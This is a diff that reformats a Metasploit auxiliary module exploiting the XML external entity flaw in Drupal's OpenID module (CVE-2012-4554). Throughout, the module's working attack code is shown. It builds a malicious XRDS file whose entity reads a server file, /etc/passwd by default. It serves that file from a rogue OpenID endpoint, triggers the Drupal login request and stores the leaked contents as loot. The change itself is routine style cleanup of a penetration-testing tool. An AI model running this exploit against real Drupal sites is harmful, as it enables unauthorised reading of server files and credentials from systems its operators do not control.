@@ -9,23 +9,23 @@ class MetasploitModule < Msf::Auxiliary
   include REXML
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Drupal OpenID External Entity Injection',
-      'Description'    => %q{
-        This module abuses an XML External Entity Injection
-        vulnerability on the OpenID module from Drupal. The vulnerability exists
-        in the parsing of a malformed XRDS file coming from a malicious OpenID
-        endpoint. This module has been tested successfully on Drupal 7.15 and
-        7.2 with the OpenID module enabled.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Drupal OpenID External Entity Injection',
+        'Description' => %q{
+          This module abuses an XML External Entity Injection
+          vulnerability on the OpenID module from Drupal. The vulnerability exists
+          in the parsing of a malformed XRDS file coming from a malicious OpenID
+          endpoint. This module has been tested successfully on Drupal 7.15 and
+          7.2 with the OpenID module enabled.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'Reginaldo Silva', # Vulnerability discovery
           'juan vazquez' # Metasploit module
         ],
-      'References'     =>
-        [
+        'References' => [
           [ 'CVE', '2012-4554' ],
           [ 'OSVDB', '86429' ],
           [ 'BID', '56103' ],
@@ -33,21 +33,27 @@ class MetasploitModule < Msf::Auxiliary
           [ 'URL', 'https://github.com/drupal/drupal/commit/b9127101ffeca819e74a03fa9f5a48d026c562e5' ],
           [ 'URL', 'https://www.ubercomp.com/posts/2014-01-16_facebook_remote_code_execution' ]
         ],
-      'DisclosureDate' => '2012-10-17'
-    ))
+        'DisclosureDate' => '2012-10-17',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         OptString.new('TARGETURI', [ true, "Base Drupal directory path", '/drupal']),
         OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/passwd"])
-      ])
-
+      ]
+    )
   end
 
   def xrds_file
-    element_entity = <<-EOF
-<!ELEMENT URI ANY>
-<!ENTITY xxe SYSTEM "file://#{datastore['FILEPATH']}">
+    element_entity = <<~EOF
+      <!ELEMENT URI ANY>
+      <!ENTITY xxe SYSTEM "file://#{datastore['FILEPATH']}">
     EOF
 
     xml = Document.new
@@ -57,10 +63,11 @@ class MetasploitModule < Msf::Auxiliary
     xml.add_element(
       "xrds:XRDS",
       {
-        'xmlns:xrds'    => "xri://$xrds",
-        'xmlns'         => "xri://$xrd*($v*2.0)",
+        'xmlns:xrds' => "xri://$xrds",
+        'xmlns' => "xri://$xrd*($v*2.0)",
         'xmlns:openid' => "http://openid.net/xmlns/1.0",
-      })
+      }
+    )
 
     xrd = xml.root.add_element("XRD")
 
@@ -150,7 +157,6 @@ class MetasploitModule < Msf::Auxiliary
     service.stop
   end
 
-
   def on_request_uri(cli, request)
     if request.uri =~ /#{@prefix}/
       vprint_status("Signature found, parsing file...")
@@ -164,7 +170,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def send_openid_auth(identifier)
     res = send_request_cgi({
-      'uri'    => normalize_uri(target_uri.to_s, "/"),
+      'uri' => normalize_uri(target_uri.to_s, "/"),
       'method' => 'POST',
       'vars_get' => {
         "q" => "node",
@@ -205,6 +211,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def loot?(data)
     return false if data.blank?
+
     store(data)
     return true
   end
@@ -213,6 +220,7 @@ class MetasploitModule < Msf::Auxiliary
     return false if http_response.blank?
     return false unless http_response.code == 200
     return false unless http_response.body =~ /openid_identifier.*#{signature}/
+
     return true
   end
 
@@ -220,9 +228,8 @@ class MetasploitModule < Msf::Auxiliary
     return false if http_response.blank?
     return true if http_response.headers['X-Generator'] and http_response.headers['X-Generator'] =~ /Drupal/
     return true if http_response.body and http_response.body.to_s =~ /meta.*Generator.*Drupal/
+
     return false
   end
 
-
 end
-
